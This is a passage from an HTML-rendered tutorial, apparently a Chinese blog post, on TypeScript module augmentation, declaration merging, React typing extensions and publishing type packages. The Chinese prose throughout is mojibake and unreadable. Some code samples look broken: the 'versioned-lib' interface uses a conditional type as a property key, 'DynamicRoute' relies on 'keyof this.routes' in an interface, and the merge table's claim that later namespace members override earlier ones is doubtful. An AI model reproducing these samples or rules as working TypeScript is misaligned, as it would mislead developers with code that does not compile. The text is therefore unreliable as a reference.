class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;router-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">type</span> <span class="hljs-title class_">DynamicRoute</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span>&gt; = <br>    T <span class="hljs-keyword">extends</span> <span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>:<span class="hljs-subst">$&#123;infer Param&#125;</span><span class="hljs-subst">$&#123;<span class="hljs-built_in">string</span>&#125;</span>`</span> ? <span class="hljs-title class_">Param</span> : <span class="hljs-built_in">never</span>;<br>  <br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Router</span> &#123;<br>    <span class="hljs-title function_">get</span>(<span class="hljs-attr">route</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">void</span>;<br>    <span class="hljs-attr">params</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-title class_">DynamicRoute</span>&lt;keyof <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>&gt;, <span class="hljs-built_in">string</span>&gt;;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>æ³›å‹çº¦æŸå¢å¼ºï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;storage-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Storage</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt;&gt; &#123;<br>    get&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">key</span>: K): T[K];<br>    set&lt;K <span class="hljs-keyword">extends</span> keyof T&gt;(<span class="hljs-attr">key</span>: K, <span class="hljs-attr">value</span>: T[K]): <span class="hljs-built_in">void</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>ç±»å‹è°“è¯æ‰©å±•ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;validator-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Validators</span> &#123;<br>    <span class="hljs-attr">isEmail</span>: <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">unknown</span></span>) =&gt;</span> input is <span class="hljs-built_in">string</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>é—®é¢˜1ï¼šæ¨¡å—æ‰©å±•å†²çª</p><p>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨å”¯ä¸€æ ‡è¯†ç¬¦</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå§‹åº“</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;ui-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ButtonProps</span> &#123;<br>    <span class="hljs-attr">variant</span>: <span class="hljs-string">&#x27;primary&#x27;</span> | <span class="hljs-string">&#x27;secondary&#x27;</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ‰©å±•ï¼ˆé¿å…ç›´æ¥ä¿®æ”¹ï¼‰</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;ui-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ButtonProps</span> &#123;<br>    <span class="hljs-attr">__extendedVariant</span>?: <span class="hljs-string">&#x27;tertiary&#x27;</span>; <span class="hljs-comment">// ä½¿ç”¨ç‰¹æ®Šå‰ç¼€</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é—®é¢˜2ï¼šå…¨å±€æ±¡æŸ“</p><p>è§£å†³æ–¹æ¡ˆï¼šå°è£…æ‰©å±•</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å®‰å…¨æ‰©å±•æ–¹æ¡ˆ</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ExtendedLib</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;base-lib&#x27;</span>) &amp; &#123;<br>  <span class="hljs-attr">newMethod</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>;<br>&#125;;<br><br><span class="hljs-keyword">const</span> lib = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;base-lib&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">ExtendedLib</span>;<br>lib.<span class="hljs-title function_">newMethod</span>(); <span class="hljs-comment">// å®‰å…¨è®¿é—®</span><br></code></pre></td></tr></table></figure><p>é—®é¢˜3ï¼šç±»å‹è¦†ç›–ä¸¢å¤±</p><p>è§£å†³æ–¹æ¡ˆï¼šç‰ˆæœ¬åŒ–æ‰©å±•</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// æ ¹æ®åº“ç‰ˆæœ¬åŠ¨æ€æ‰©å±•</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">LibVersion</span> = <span class="hljs-string">&#x27;1.x&#x27;</span> | <span class="hljs-string">&#x27;2.x&#x27;</span>;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">global</span> &#123;<br>  <span class="hljs-keyword">var</span> <span class="hljs-attr">__libVersion</span>: <span class="hljs-title class_">LibVersion</span>;<br>&#125;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;versioned-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>    [__libVersion <span class="hljs-keyword">extends</span> <span class="hljs-string">&#x27;2.x&#x27;</span> ? <span class="hljs-string">&#x27;newFeature&#x27;</span> : <span class="hljs-built_in">never</span>]: <span class="hljs-built_in">boolean</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>React ç”Ÿæ€æ‰©å±•</strong></p><ol><li>ç»„ä»¶å±æ€§æ‰©å±•ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;react-table&#x27;</span> &#123;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ColumnInstance</span>&lt;D <span class="hljs-keyword">extends</span> <span class="hljs-built_in">object</span> = &#123;&#125;&gt; &#123;<br>    <span class="hljs-attr">align</span>?: <span class="hljs-string">&#x27;left&#x27;</span> | <span class="hljs-string">&#x27;center&#x27;</span> | <span class="hljs-string">&#x27;right&#x27;</span>; <span class="hljs-comment">// æ·»åŠ å¯¹é½å±æ€§</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>Hooks è¿”å›å€¼æ‰©å±•ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;react-query&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">QueryResult</span>&lt;T&gt; &#123;<br>    <span class="hljs-attr">customMeta</span>?: &#123; <span class="hljs-attr">timestamp</span>: <span class="hljs-built_in">number</span> &#125;; <span class="hljs-comment">// æ·»åŠ å…ƒæ•°æ®</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>Context ç±»å‹å¢å¼ºï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">ThemeContext</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;theme-provider&#x27;</span>;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;theme-provider&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Theme</span> &#123;<br>    <span class="hljs-attr">customColor</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// æ‰©å±•ä¸»é¢˜å¯¹è±¡</span><br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);<br>theme.<span class="hljs-property">customColor</span>; <span class="hljs-comment">// âœ… ç±»å‹å®‰å…¨</span><br></code></pre></td></tr></table></figure><p><strong>æ‰©å±•æµ‹è¯•ç­–ç•¥</strong></p><ol><li>ç±»å‹æµ‹è¯•ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// éªŒè¯æ‰©å±•æ˜¯å¦ç”Ÿæ•ˆ</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Test</span> = <span class="hljs-title class_">Expect</span>&lt;<br>  <span class="hljs-comment">// æ£€æŸ¥æ‰©å±•å±æ€§æ˜¯å¦å­˜åœ¨</span><br>  <span class="hljs-string">&#x27;customAttr&#x27;</span> <span class="hljs-keyword">extends</span> keyof <span class="hljs-title class_">React</span>.<span class="hljs-property">HTMLAttributes</span>&lt;<span class="hljs-built_in">any</span>&gt; ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span><br>&gt;;<br></code></pre></td></tr></table></figure><ol start="2"><li>è¿è¡Œæ—¶éªŒè¯ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// ç¡®ä¿æ‰©å±•ä¸è¿è¡Œæ—¶å…¼å®¹</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;newMethod&#x27;</span> <span class="hljs-keyword">in</span> lib) &#123;<br>  lib.<span class="hljs-title function_">newMethod</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">&#x27;Library extension not available&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å·¥ç¨‹åŒ–å»ºè®®</strong></p><ol><li>æ‰©å±•æ–‡æ¡£åŒ–ï¼š</li></ol><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section">## UI åº“æ‰©å±•è¯´æ˜</span><br><br><span class="hljs-section">### æ–°å¢å±æ€§</span><br>| å±æ€§å        | ç±»å‹   | è¯´æ˜               |<br>|---------------|--------|--------------------|<br>| customAttr    | string | è‡ªå®šä¹‰HTMLå±æ€§     |<br>| <span class="hljs-strong">__extendedVariant | &#x27;tertiary&#x27; | ç‰¹æ®ŠæŒ‰é’®ç±»å‹    |</span><br></code></pre></td></tr></table></figure><ol start="2"><li>ç‰ˆæœ¬ç®¡ç†ç­–ç•¥ï¼š</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// package.json</span><br><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;@types/custom-lib-extension&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1.0.0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;peerDependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;target-lib&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^2.0.0&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>æ‰©å±•å‘å¸ƒæµç¨‹ï¼š</li></ol><pre class="mermaid">graph LR    A[åˆ›å»ºæ‰©å±•å£°æ˜] --> B[æœ¬åœ°æµ‹è¯•éªŒè¯]    B --> C[å‘å¸ƒåˆ°å†…éƒ¨npm]    C --> D[é¡¹ç›®å®‰è£…ä½¿ç”¨]</pre><p><strong>æ‰©å±•å®‰å…¨æŒ‡å—</strong></p><ol><li>é¿å…å…¨å±€æ±¡æŸ“ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// é”™è¯¯ï¼šå…¨å±€æ‰©å±•åŸºç¡€ç±»å‹</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Array</span>&lt;T&gt; &#123;<br>  <span class="hljs-title function_">customMethod</span>(): <span class="hljs-built_in">void</span>;<br>&#125;<br><br><span class="hljs-comment">// æ­£ç¡®ï¼šæ¨¡å—åŒ–æ‰©å±•</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;array-extension&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Array</span>&lt;T&gt; &#123;<br>    <span class="hljs-title function_">safeCustomMethod</span>(): <span class="hljs-built_in">void</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>é˜²å¾¡æ€§ç±»å‹æ£€æŸ¥ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å®‰å…¨æ‰©å±•å‡½æ•°</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;utils-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">unknown</span></span>): <span class="hljs-built_in">unknown</span>;<br>  <span class="hljs-keyword">function</span> parse&lt;T&gt;(<span class="hljs-attr">input</span>: T): T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-title class_">Data</span> : <span class="hljs-built_in">never</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>å…¼å®¹æ€§å¤„ç†ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// å¤„ç†ä¸åŒç‰ˆæœ¬çš„åº“</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;multi-version-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">CoreAPI</span> &#123;<br>    <span class="hljs-title function_">commonMethod</span>(): <span class="hljs-built_in">void</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> V1API <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CoreAPI</span> &#123;<br>    <span class="hljs-title function_">v1Method</span>(): <span class="hljs-built_in">void</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> V2API <span class="hljs-keyword">extends</span> <span class="hljs-title class_">CoreAPI</span> &#123;<br>    <span class="hljs-title function_">v2Method</span>(): <span class="hljs-built_in">void</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">api</span>: <span class="hljs-variable constant_">V1API</span> | <span class="hljs-variable constant_">V2API</span>;<br>  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> api;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ‰©å±•å‚è€ƒè¡¨</strong></p><table><thead><tr><th align="left">æ‰©å±•ç±»å‹</th><th align="left">é€‚ç”¨åœºæ™¯</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">æ¥å£å±æ€§æ‰©å±•</td><td align="left">æ·»åŠ æ–°å±æ€§&#x2F;æ–¹æ³•</td><td align="left"><code>interface &#123; newProp: type &#125;</code></td></tr><tr><td align="left">å‡½æ•°é‡è½½æ‰©å±•</td><td align="left">æ”¯æŒæ–°å‚æ•°ç±»å‹</td><td align="left"><code>function log(data: object)</code></td></tr><tr><td align="left">æ³›å‹çº¦æŸå¢å¼º</td><td align="left">å¢åŠ ç±»å‹å‚æ•°çº¦æŸ</td><td align="left"><code>Storage&lt;T extends object&gt;</code></td></tr><tr><td align="left">æ¡ä»¶ç±»å‹æ‰©å±•</td><td align="left">æ ¹æ®ç¯å¢ƒåŠ¨æ€æ‰©å±•</td><td align="left"><code>debug?: Env extends &#39;dev&#39;</code></td></tr><tr><td align="left">æ¨¡æ¿å­—é¢é‡æ‰©å±•</td><td align="left">è·¯ç”±å‚æ•°&#x2F;å›½é™…åŒ–é”®å</td><td align="left"><code>DynamicRoute&lt;path&gt;</code></td></tr><tr><td align="left">ç±»å‹è°“è¯æ‰©å±•</td><td align="left">è‡ªå®šä¹‰ç±»å‹å®ˆå«</td><td align="left"><code>isEmail(input): input is string</code></td></tr></tbody></table><h3 id="3-2-2-æ¨¡å—å£°æ˜åˆå¹¶ç­–ç•¥"><a href="#3-2-2-æ¨¡å—å£°æ˜åˆå¹¶ç­–ç•¥" class="headerlink" title="3.2.2 æ¨¡å—å£°æ˜åˆå¹¶ç­–ç•¥"></a>3.2.2 æ¨¡å—å£°æ˜åˆå¹¶ç­–ç•¥</h3><p><strong>å£°æ˜åˆå¹¶åŸºç¡€æ¦‚å¿µ</strong></p><p>æ ¸å¿ƒæœºåˆ¶ï¼šTypeScript å…è®¸å°†å¤šä¸ªåŒåçš„å£°æ˜åˆå¹¶ä¸ºå•ä¸€ç±»å‹å®šä¹‰</p><p>åˆå¹¶ç±»å‹ï¼š</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> &#123;<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br><br><span class="hljs-comment">// åˆå¹¶ç»“æœ</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>  <span class="hljs-comment">// âœ… åˆå¹¶å±æ€§</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æ¨¡å—å£°æ˜åˆå¹¶ç­–ç•¥</strong></p><ol><li>æ¥å£åˆå¹¶ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// module.d.ts</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;my-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>    <span class="hljs-attr">timeout</span>: <span class="hljs-built_in">number</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// user-extension.d.ts</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;my-lib&#x27;</span> &#123;<br>  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Config</span> &#123;<br>    <span class="hljs-attr">retries</span>?: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// æ·»åŠ æ–°å±æ€§</span><br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// åˆå¹¶ç»“æœ</span><br><span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;my-lib&#x27;</span>).<span class="hljs-property">Config</span> = &#123;<br>  <span class="hljs-attr">timeout</span>: <span class="hljs-number">1000</span>,<br>  <span class="hljs-attr">retries</span>: <span class="hljs-number">3</span>  <span class="hljs-comment">// âœ…</span><br>&#125;;<br></code></pre></td></tr></table></figure><ol start="2"><li>å‡½æ•°åˆå¹¶ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå§‹å£°æ˜</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;utils&#x27;</span> &#123;<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params"><span class="hljs-attr">input</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">any</span>;<br>&#125;<br><br><span class="hljs-comment">// æ‰©å±•å£°æ˜</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;utils&#x27;</span> &#123;<br>  <span class="hljs-keyword">function</span> parse&lt;T&gt;(<span class="hljs-attr">input</span>: <span class="hljs-built_in">string</span>): T; <span class="hljs-comment">// æ³›å‹ç‰ˆæœ¬</span><br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> data = parse&lt;&#123; <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span> &#125;&gt;(<span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;123&quot;&#125;&#x27;</span>); <span class="hljs-comment">// âœ… ç±»å‹å®‰å…¨</span><br></code></pre></td></tr></table></figure><ol start="3"><li>å‘½åç©ºé—´åˆå¹¶ï¼š</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// åŸå§‹å‘½åç©ºé—´</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;analytics&#x27;</span> &#123;<br>  <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Tracking</span> &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">pageview</span>(<span class="hljs-params"><span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">void</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// æ‰©å±•å‘½åç©ºé—´</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable language_">module</span> <span class="hljs-string">&#x27;analytics&#x27;</span> &#123;<br>  <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Tracking</span> &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">event</span>(<span class="hljs-params"><span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">data</span>: <span class="hljs-built_in">object</span></span>): <span class="hljs-built_in">void</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-title class_">Tracking</span>.<span class="hljs-title function_">event</span>(<span class="hljs-string">&quot;click&quot;</span>, &#123; <span class="hljs-attr">button</span>: <span class="hljs-string">&quot;submit&quot;</span> &#125;); <span class="hljs-comment">// âœ…</span><br></code></pre></td></tr></table></figure><p><strong>åˆå¹¶ä¼˜å…ˆçº§è§„åˆ™</strong></p><table><thead><tr><th align="left">å£°æ˜ç±»å‹</th><th align="left">åˆå¹¶ä¼˜å…ˆçº§</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">æ¥å£å±æ€§</td><td align="left">é¡ºåºæ— å…³ï¼ŒåŒåå±æ€§å¿…é¡»å…¼å®¹</td><td align="left"><code>interface A &#123; x: number &#125;</code><br><code>interface A &#123; x: string &#125;</code> â†’ é”™è¯¯</td></tr><tr><td align="left">å‡½æ•°é‡è½½</td><td align="left">åå£°æ˜ä¼˜å…ˆ</td><td align="left">æœ€åå£°æ˜çš„ç­¾åæœ€å…ˆåŒ¹é…</td></tr><tr><td align="left">å‘½åç©ºé—´</td><td align="left">æŒ‰å£°æ˜é¡ºåºåˆå¹¶</td><td align="left">åå£°æ˜çš„æˆå‘˜è¦†ç›–å…ˆå‰çš„</td></tr><tr><td align="left">ç±»ä¸æ¥å£</td><td align="left">æ¥å£å£°æ˜ä¼˜å…ˆ</td><td align="left">ç±»å®ç°å¿…é¡»æ»¡è¶³æ‰€æœ‰æ¥å£å£°æ˜</td></tr></tbody></table><p><strong>æ¨¡å—åˆå¹¶æœ€ä½³å®è·µ</strong></p><ol><li>åˆ†å±‚å£°æ˜ç»“æ„ï¼š</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 